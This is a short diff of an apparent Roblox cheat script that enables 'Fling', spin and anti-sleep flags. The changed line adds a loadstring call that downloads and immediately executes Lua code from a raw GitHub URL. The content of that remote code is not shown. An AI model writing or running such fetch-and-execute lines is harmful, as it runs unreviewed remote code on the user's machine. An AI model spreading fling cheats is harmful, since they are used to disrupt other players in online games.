@@ -13,7 +13,7 @@ getgenv().Fling = true
 getgenv().AutoReclaim = true
 getgenv().AntiSleep = true
 getgenv().EnableSpin = true
-loadstring(game:HttpGetAsync("", true))()
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Copinface/Main/main/fe%20stuff/what%20this", true))()
 Root.Transparency = 0
 
 Highlight.Parent = Root
